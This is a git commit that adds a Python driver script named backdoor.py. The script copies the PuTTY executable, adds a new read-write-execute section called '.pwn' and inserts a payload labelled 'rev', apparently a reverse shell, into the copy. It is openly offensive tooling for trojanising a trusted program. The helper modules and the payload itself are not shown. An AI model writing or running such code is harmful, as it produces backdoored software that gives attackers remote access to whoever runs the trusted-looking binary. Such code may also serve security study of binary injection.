fa0b73f8df23fb3d1ac5e3d571cd571f9982e204
Jordan Sosnowski <jjs0029@auburn.edu>
2020-02-15 18:41:41 -0600

    Add driver

---
+++ src/backdoor.py
@@ -0,0 +1,17 @@
+import payload_injection
+import section_injection
+import utilities
+
+path = utilities.make_duplicate("./assets/bin/putty.exe", 'injection')
+file_info = [path,
+             ".pwn",
+             0x1000,        # Page Size 1024
+             0x1000,        # Section Size 1024
+             0xE0000000]    # permissions READ WRITE EXECUTE
+section_injection.add_section(file_info)
+
+p = 'rev'
+path = utilities.make_duplicate("./assets/bin/putty_injection.exe", p)
+info = [path,
+        p]
+payload_injection.insert_payload(info)
